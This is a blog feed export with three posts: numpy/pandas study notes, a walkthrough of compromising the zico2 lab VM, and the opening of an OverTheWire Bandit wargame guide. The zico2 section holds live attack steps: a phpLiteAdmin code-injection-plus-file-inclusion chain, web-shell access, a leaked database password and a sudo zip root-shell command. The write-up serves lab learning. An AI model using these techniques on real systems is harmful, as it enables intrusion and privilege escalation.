class="line-numbers language-python" data-language="python"><code class="language-python">import numpy as nparr = np.array([1,2,3])arr #cell中输出的时候直接打元素名就行 不用echo输出：array([1,2,3])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2创建一个多维数组"><a href="#1-2创建一个多维数组" class="headerlink" title="1.2创建一个多维数组"></a><strong>1.2创建一个多维数组</strong></h3><pre class="line-numbers language-none"><code class="language-none">arr = np.array([1,2,3],[4,5,6])arr输出：array([1,2,3],  [4,5,6])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组和列表的区别是什么呢？<br>-数组中存储的数据元素类型都是统一的<br>-优先级：字符串&gt;浮点型&gt;整数</p><pre class="line-numbers language-none"><code class="language-none">例如：arr = np.array([1,2.2,3])arr输出：array([1.,2.2,3.])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-1将外部的一张图片读取并加载到numpy数组中"><a href="#2-1将外部的一张图片读取并加载到numpy数组中" class="headerlink" title="2.1将外部的一张图片读取并加载到numpy数组中"></a>2.1将外部的一张图片读取并加载到numpy数组中</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">import matplotlib.pyplot as pltimg_arr = plt.imread('./1.jpg') #返回的数组，数组中装载的就是图片内容plt.imshow(img_arr) #将numpy数组进行可视化展示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出结果即为1.jpg的图像内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">img_arr = img_arr - 100 #将每一个数组元素都减去100plt.imshow(img_arr)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>输出结果是色调有差别的图像内容</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">np.ones(shape=(3,4)) #输出结果是一个三行 四列的数组np.linspace(0,100,num=20) #项数为20的一维等差数列数组np.arange(10,50,step=2) #返回了10开头 50结尾 公差为2的一维数组np.random.randint(0,100,size=(5,6)) #生成一个五行六列的数组 内容为随机数数组名.shape #输出为数组的形状(行数，列数)数组名.ndim #返回的是数组的维度(数组里包了几个数组)数组名.size #返回数组元素的个数数组名.dtype #返回数组元素的类型创建数组的时候输入dtype参数来指定元素类型或者通过 数组名.dtype = “指定类型” 来修改type(数组名) #返回数组的数据类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-1numpy的索引和切片操作"><a href="#3-1numpy的索引和切片操作" class="headerlink" title="3.1numpy的索引和切片操作"></a>3.1numpy的索引和切片操作</h2><p>索引和列表同理</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">创建一个数组之后 我们可以取出数组的指定数据数组名[1,4] #取出数组中下标为1,4的数据数组名[0：2] #切出数组前两行的数据数组名[:,0:2] #切出数组前两列的数据数组名[0:2,0:2] #切出数组前两行前两列的数据数组名[::-1] #将数组的行倒置数组名[:,::-1]  #将数组的列倒置数组名[::-1,::-1] #整个倒置左右反转图片img_arr = plt.imread('./1.jpg') #返回的数组，数组中装载的就是图片内容plt.imshow(img_arr[:,::-1,:]) #三个数值分别代表行 列 颜色上下反转图片plt.imshow(img_arr[::-1,:,:]) #三个数值分别代表行 列 颜色图片裁剪功能plt.imshow(img_arr[66:200,78:300,:]) #三个数值分别代表行 列 颜色变形（reshape）数组名.reshape((30,)) #把二维的数组变形成一维数组名.reshape((2,15)) #将一维变形成多维数组名.reshape((6,5)) #将一维变形成多维级联操作-将多个numpy数组进行横向纵向的拼接axis轴向0为列 纵向拼接 1为行 横向拼接（行与列无法对应会报错哦）np.consatenate((数列1,数列2),axis=1)图片的拼接np.consatenate((数列1,数列2,数列3),axis=1)plt.imshow(img_arr) #三个数值分别代表行 列 颜色常用聚合操作-sum,max,min,mean计算和 最大值 最小值 求均值-sin,cos,tan三角函数around(a,decimals)a:数组名 decimals:舍入的小数位数numpy.amin()和numpy.amax(),用于计算数组中的元素沿指定轴的最小、最大值。numpy.ptp(),计算数组中元素最大值与最小值的差numpy.median(),计算数组中元素的中位数std() var()输出标准差与方差 方差就是标准差的平方使用例:数组名[1].std() #输出第一行的标准差还有数学里的矩阵相加 相减 相乘 eye() #返回一个标准的单位矩阵.T #转置矩阵（行变成列 列变成行）np.dot(数列1,数列2) #两个数列相乘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="panda基础操作"><a href="#panda基础操作" class="headerlink" title="panda基础操作"></a>panda基础操作</h2><p>numpy是用来处理数值型的数据 还有很多其他类型的数据(字符串，时间序列)<br>那么什么是pandas捏？<br>首先来认识pandas中的两个常用的类<br>    -Series<br>    -DataFrame<br>Series是一种类似于一维数组的对象，由下面两个部分组成:<br>    values:一组数据<br>    index:相关的数据索引标签<br>Series的创建<br>    -由列表或numpy数组创建。<br>    -由字典创建</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pandas import Seriess = Series(data=[1,2,3,'four'])s#输出结果类似于卡西欧(是的就是计算器)的数组表现形式0112233fourdtype:objectimport numpy as npSeries(data=np.random.randint(0,100,size=(3,1)))#必须是一维数组 不然会报错03143282dtype:int64from pandas import Series#index用来指定显示索引s = Series(data=[1,2,3,'four'],index=['a','b','c','d'])sa1b2c3dfourdtype:object#显示索引可以增强Series的可读性dic = {'语文':100,'数学':99,'理综':250,}s = Series(data=dic)s语文100数学99理综250dtype:int64s.[0]100s.语文100s[0:2]语文100数学99dtype:int64s.shape #返回Series的形状s.size #返回Series元素的个数s.index #返回Series的索引 s.values #返回Series的值s.dtype #返回元素类型 o代表object(字符串)s.head(n) #前n个数据 s.tail(n) #后n个元素s.unique #去重s.isnull #判断元素是否为空 空返回Ture 反之Falses.notnull #反之Series的算术运算直接 a = 数组1+数组2即可index一致的元素会进行算数运算 否则算空<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>————————————————————————————————————————<br>那么接下来是DataFrame 他是一个表格型的数据库</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pandas import DataFramedf = DataFrame(data=[1,2,3],[4,5,6])df#输出结果  0 1 2————————0 1 2 31 4 5 6df = DataFrame(data=np.random.randint(0,100,size=(6,4)))df#输出结果为一个六行四列 内容为0-100随机数的表格dic = {    'name':['zhangsan','lisi','wanglaowu'],'salary':[1000,2000,3000]}df = DataFrame(data=dic,index=['a','b','c'])df#输出结果为        name   salary——————————————————————a    zhangsan   1000b        lisi   2000c   wanglaowu   3000#DataFrame的属性values、columns、index、shapedf.values #返回二维numpy数df.columns #返回列索引df.index #返回行索引df.shape #返回形状df.dtype #报错 因为DataFrame可以装不同类型的数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>df的索引＆切片</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">df = DataFrame(data=dic,index=['a','b','c'])df#输出结果为        name   salary——————————————————————a    zhangsan   1000b        lisi   2000c   wanglaowu   3000df['name'] #显示列时输入索引名即可#输出结果为        name  —————————————a    zhangsan  b        lisi c   wanglaowu  显示多列时加逗号与另一个引号df.loc[a]df.iloc[[a,b]] #显示行 iloc指隐式索引 loc指显示索引#输出结果为        name   salary——————————————————————a    zhangsan   1000b        lisi   2000df.iloc[a,b] #显示第a行 第b列的单个元素切片df[0:2] #切行df.iloc[:,0:2] #切列<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></body></html>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;数据分析是干啥的&quot;&gt;&lt;a href=&quot;#数据分析是干啥的&quot; class=&quot;headerlink&quot; title=&quot;数据分析是干啥的&quot;&gt;&lt;/a&gt;数据分析是干啥的&lt;/h2&gt;&lt;p&gt;-整合一堆杂乱无章的数据 把背后的信息提炼出来 使数据的价值最大化&lt;br&gt;–分析用户的消费行为 指定相应的方案 调整促销时间 力度 计算用户活跃度和产品的回购力度&lt;br&gt;–分析广告的点击率 决定广告的投放时间 制定广告方案 决定投放等等&lt;/p&gt;
&lt;p&gt;例：&lt;br&gt;1.保险公司从大量的赔付申请数据中判断哪些存在骗保可能&lt;br&gt;2.支付宝通过用户消费记录和行为自动调整花呗额度&lt;br&gt;3.短视频通过用户的点击和观看行为给用户推送合适的视频&lt;/p&gt;
&lt;h2 id=&quot;我为啥要学数据分析&quot;&gt;&lt;a href=&quot;#我为啥要学数据分析&quot; class=&quot;headerlink&quot; title=&quot;我为啥要学数据分析&quot;&gt;&lt;/a&gt;我为啥要学数据分析&lt;/h2&gt;&lt;p&gt;&lt;del&gt;因为我现在就得用&lt;/del&gt;&lt;br&gt;可以用于某些岗位或竞赛&lt;br&gt;python数据科学的基础&lt;br&gt;机器学习课程的基础&lt;/p&gt;
&lt;h2 id=&quot;数据分析的流程&quot;&gt;&lt;a href=&quot;#数据分析的流程&quot; class=&quot;headerlink&quot; title=&quot;数据分析的流程&quot;&gt;&lt;/a&gt;数据分析的流程&lt;/h2&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>zico2解析</title>
    <link href="https://www.maonie.top/2024/03/28/zico2%E8%A7%A3%E6%9E%90/"/>
    <id>https://www.maonie.top/2024/03/28/zico2%E8%A7%A3%E6%9E%90/</id>
    <published>2024-03-28T02:30:05.000Z</published>
    <updated>2024-03-28T05:19:50.895Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>攻击机：kali<br>靶机：zico2</p><h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><p>Poc Exp 和payload 的关系<br>dirb （网站目录扫描）<br>文件包含漏洞<br>mysql相关（虽然是图形化页面）<br>一句话木马+蚁剑<br>zip提权</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>先把俩机子开开<span id="more"></span><br>扫一下同网段设备<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>看到靶机开放了 22 80 56444等端口<br>我们访问http服务 没发现什么 用dirb扫描看一下<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>存在/dbadmin/目录 进入之后是个登陆页面 写着phpLiteAdmin v1.9.3<br> <img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/3.jpg" alt="3"><br>那就用searchsploit来寻找可行的漏洞<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/4.jpg" alt="4"><br>找到四个 我们用searchsploit -m 下载第三个漏洞文件到本地<br>下载后查看发现该文件中写着POC 也就是Proof of Concept 这是什么意思呢<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/6.jpg" alt="6"></p><blockquote><p>POC和EXP</p><p>POC = Proof of Concept中文意思是“观点证明”。这个短语并非仅仅在漏洞报告中使用，甲方在项目招标过程中也常常要求乙方提供POC，即证明你的方案或者产品能达到声称的功能或性能，漏洞报告中的POC则是一段说明或者一个攻击的样例，使得读者能够确认这个漏洞是真实存在的。</p><p>EXP = Exploit的中文意思是“漏洞利用”。意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法。</p><p>如下视图所示：<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/5.png" alt="5"></p><p>POC，是用来验证漏洞是否存在的一段代码。<br>EXP，指利用系统漏洞进行渗透。<br>先有POC，后有EXP。<br>Payload：中文为’有效载荷’，指成功EXP之后，真正在目标系统执行的代码或者指令<br>Shellcode：中文为’shell代码’，是Payload的一种，由于其建立正向/反向shell而得名 （正向/反向：主动/被动链接）</p></blockquote><p>绕过这个页面一般用burpsuite爆破<br>输入密码admin我们成功进入了页面<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/7.jpg" alt="7"><br>里边有一个没删的表 <code>info</code> 进去可以发现用户名root和zico与对应的密码md5加密 只要通过解密网站即可获取明文<br>主页面还有一个小按钮 按了之后发现连接中有文件包含漏洞<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/8.jpg" alt="8"><br>我们使用验证文件包含漏洞的方式 在传参中输入若干的 <code>../</code>(返回上个目录)<br>然后输入<code>/etc/passwd</code> <code>/etc/shadow</code> 若正常显示内容则表示漏洞存在<br>前者显示所有账号信息 后者显示所有用户名和密码<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/10.jpg" alt="10"><br>这里再回到之前调用的漏洞 其中说明了步骤</p><pre class="line-numbers language-none"><code class="language-none">1.创建一个database 名称为hack.php2.在其中创建一个名为123的表 插入数据&lt;?php phpinfo()?&gt; 类型为TEXT3.(使用文件包含漏洞即可)想办法运行hack.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/11.jpg" alt="11"><br>搞完之后放在文件包含漏洞里测试效果<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/12.jpg" alt="12"><br>这个页面就ok了<br>然后就都想得到嘛 用一句话代码 通过蚁剑连接<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/13.jpg" alt="13"><br>右键进入虚拟终端 在/home/zico/wordpress中查看wp-config.php的内容<br>发现一套密码<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/14.jpg" alt="14"></p><pre class="line-numbers language-none"><code class="language-none">/** MySQL database username */define('DB_USER', 'zico');/** MySQL database password */define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>账号为zico 密码为sWfCsfJSPV9H3AmQzw8<br>用这套密码和ssh登陆操作系统<br><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/15.jpg" alt="15"><br>登陆成功 使用sudo -l查看拥有sudo权限的命令 进行zip提权即可</p><pre class="line-numbers language-none"><code class="language-none">sudo zip 1.zip to_do.txt -T --unzip-command="sh -c /bin/bash"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img data-src="/2024/03/28/zico2%E8%A7%A3%E6%9E%90/16.jpg" alt="16"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一个集合了各方之长的靶机 流程很长<br>那我们下次再见！</p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;攻击机：kali&lt;br&gt;靶机：zico2&lt;/p&gt;
&lt;h1 id=&quot;相关知识&quot;&gt;&lt;a href=&quot;#相关知识&quot; class=&quot;headerlink&quot; title=&quot;相关知识&quot;&gt;&lt;/a&gt;相关知识&lt;/h1&gt;&lt;p&gt;Poc Exp 和payload 的关系&lt;br&gt;dirb （网站目录扫描）&lt;br&gt;文件包含漏洞&lt;br&gt;mysql相关（虽然是图形化页面）&lt;br&gt;一句话木马+蚁剑&lt;br&gt;zip提权&lt;/p&gt;
&lt;h1 id=&quot;具体过程&quot;&gt;&lt;a href=&quot;#具体过程&quot; class=&quot;headerlink&quot; title=&quot;具体过程&quot;&gt;&lt;/a&gt;具体过程&lt;/h1&gt;&lt;p&gt;先把俩机子开开</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/tags/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>OverTheWire-bandit解析</title>
    <link href="https://www.maonie.top/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/"/>
    <id>https://www.maonie.top/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/</id>
    <published>2024-03-21T08:50:52.000Z</published>
    <updated>2024-03-22T04:29:53.790Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="友情提示"><a href="#友情提示" class="headerlink" title="友情提示"></a>友情提示</h1><p>理论来说 这个网页的网站说了不允许剧透或是writeup<br>但这大多是为了方便我自身复习留下的资料<br>因此我不会直接在文中提供flag 只会写出方法与代码</p><h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p><a href="https://overthewire.org/wargames/bandit/bandit0.html">网页链接</a><br>该网页类似一个在线靶场 需要你登录它所提供的账号密码登录其ssh服务进行一场小游戏<br>我使用了MobaXterm来登陆/输入指令</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><h2 id="level-0-准备"><a href="#level-0-准备" class="headerlink" title="level 0/准备"></a>level 0/准备</h2><blockquote><p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.</p></blockquote><p>页面描述为指示你链接ssh服务 并给予了对应ip 端口 账号 密码<br>一旦登录成功 便可进入level0→level1的页面<br>关于登录 我们先打开MobaXterm 点击左上角的 <strong>Session</strong> 选择ssh<br>输入ip地址<code>bandit.labs.overthewire.org</code>与端口2220<br><img data-src="/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/1.jpg" alt="1"><br>确认后左边的User sessions便会多出一个连接 右键 Edit session 会进入相同的页面<br><img data-src="/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/2.jpg" alt="2"><br>先点击① 会出来账号管理器 点击②来新建一个 输入bandit0与bandit0<br>保存好后在登陆前勾选左边的 <code>Specify username</code> 选择对应账号名即可快速登陆<br>注：使用MobaXterm的该功能必须设定一个高级密码 请不要忽视它跳出的窗口<br>每道题里的flag相当于下一题的账号密码<br>也就是说下道题的结论是 账号 <strong>bandit(题号)</strong> 与 密码 <strong>flag值</strong><br>这些即为前提 接下来正式入手</p><span id="more"></span><h2 id="level1-起始"><a href="#level1-起始" class="headerlink" title="level1/起始"></a>level1/起始</h2><blockquote><h1 id="Bandit-Level-0-→-Level-1"><a href="#Bandit-Level-0-→-Level-1" class="headerlink" title="Bandit Level 0 → Level 1"></a>Bandit Level 0 → Level 1</h1><h2 id="Level-Goal"><a href="#Level-Goal" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>readme</strong> located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.</p><h2 id="Commands-you-may-need-to-solve-this-level"><a href="#Commands-you-may-need-to-solve-this-level" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>根据题目描述 在主目录下有名为readme的文件 查看该文件内容即可获取密码<br>既然是在主目录下 其实连ls都省了 直接 <code>cat readme</code>即可获取flag值</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><blockquote><h1 id="Bandit-Level-1-→-Level-2"><a href="#Bandit-Level-1-→-Level-2" class="headerlink" title="Bandit Level 1 → Level 2"></a>Bandit Level 1 → Level 2</h1><h2 id="Level-Goal-1"><a href="#Level-Goal-1" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>-</strong> located in the home directory</p><h2 id="Commands-you-may-need-to-solve-this-level-1"><a href="#Commands-you-may-need-to-solve-this-level-1" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>此关的目的是读取一个名为-的文件<br>由于-的名称与root根目录相同 直接cat或者加引号都无法读取<br>因此需要转为绝对路径<code>./-</code><br>输入<code>cat ./-</code>来获取flag值</p><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><blockquote><h1 id="Bandit-Level-2-→-Level-3"><a href="#Bandit-Level-2-→-Level-3" class="headerlink" title="Bandit Level 2 → Level 3"></a>Bandit Level 2 → Level 3</h1><h2 id="Level-Goal-2"><a href="#Level-Goal-2" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file called <strong>spaces in this filename</strong> located in the home directory</p><h2 id="Commands-you-may-need-to-solve-this-level-2"><a href="#Commands-you-may-need-to-solve-this-level-2" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>这关是考察通过cat获取文件名中有空格的文件内容<br>用引号来转义空格 使系统识别后部分为一个整体即可<br><code>cat ‘spaces in this filename’</code></p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><blockquote><h1 id="Bandit-Level-3-→-Level-4"><a href="#Bandit-Level-3-→-Level-4" class="headerlink" title="Bandit Level 3 → Level 4"></a>Bandit Level 3 → Level 4</h1><h2 id="Level-Goal-3"><a href="#Level-Goal-3" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a hidden file in the <strong>inhere</strong> directory.</p><h2 id="Commands-you-may-need-to-solve-this-level-3"><a href="#Commands-you-may-need-to-solve-this-level-3" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>题目描述有一个被隐藏的文件藏在了inhere目录中 叫我们尝试读取<br>那就使用ls的-a附加项来查看隐藏文件<br>使用cd来切换目录</p><pre class="line-numbers language-none"><code class="language-none">cd inhere //切换至inhere目录ls -al //列出所有文件 显示隐藏文件并显示详细信息cat .hidden //查看文件内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><blockquote><h1 id="Bandit-Level-4-→-Level-5"><a href="#Bandit-Level-4-→-Level-5" class="headerlink" title="Bandit Level 4 → Level 5"></a>Bandit Level 4 → Level 5</h1><h2 id="Level-Goal-4"><a href="#Level-Goal-4" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the only human-readable file in the <strong>inhere</strong> directory. Tip: if your terminal is messed up, try the “reset” command.</p><h2 id="Commands-you-may-need-to-solve-this-level-4"><a href="#Commands-you-may-need-to-solve-this-level-4" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/ls.1.html">ls</a> , <a href="https://man7.org/linux/man-pages/man1/cd.1p.html">cd</a> , <a href="https://man7.org/linux/man-pages/man1/cat.1.html">cat</a> , <a href="https://man7.org/linux/man-pages/man1/file.1.html">file</a> , <a href="https://man7.org/linux/man-pages/man1/du.1.html">du</a> , <a href="https://man7.org/linux/man-pages/man1/find.1.html">find</a></p></blockquote><p>inhere目录中唯一可读的文件才是我们追求的答案<br>我们查看下边提示中的命令列表 发现了file命令可用<br>经过搜索得知 Linux file命令用于辨识文件类型<br>注：文件名前加了- 无法正常读取 需要使用相对路径</p><pre class="line-numbers language-none"><code class="language-none">file ./* //显示同个目录下的所有文件的文件类型观察结果： ./*./-file00: data./-file01: data./-file02: data./-file03: data./-file04: data./-file05: data./-file06: data./-file07: ASCII text./-file08: data./-file09: data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显 只有-file07为ASII text形式 只需读取即可</p><pre class="line-numbers language-none"><code class="language-none">cat ./-file07<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><blockquote><h1 id="Bandit-Level-5-→-Level-6"><a href="#Bandit-Level-5-→-Level-6" class="headerlink" title="Bandit Level 5 → Level 6"></a>Bandit Level 5 → Level 6</h1><h2 id="Level-Goal-5"><a href="#Level-Goal-5" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in a file somewhere under the <strong>inhere</strong> directory and has all of the following properties:</p><ul><li>human-readable</li><li>1033 bytes in size</li><li>not executable</li></ul></blockquote><p>inhere目录中的指定文件存有flag 以下为flag文件的特征：<br>可读性 大小1033字节 无法运行<br>这里我们使用find命令的附加项即可</p><pre class="line-numbers language-none"><code class="language-none">find [路径] [匹配条件] [动作]-name pattern：按文件名查找，支持使用通配符 * 和 ?。-type type：按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。-size [+-]size[cwbkMG]：按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。-mtime days：按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。-user username：按文件所有者查找。-group groupname：按文件所属组查找。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入inhere目录 </p><pre class="line-numbers language-none"><code class="language-none">ls -altotal 88drwxr-x--- 22 root bandit5 4096 Oct  5 06:19 .drwxr-xr-x  3 root root    4096 Oct  5 06:19 ..drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere00drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere01drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere02drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere03drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere04drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere05drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere06drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere07drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere08drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere09drwxr-x---  2 root bandit5 4096 Oct  5 06:19 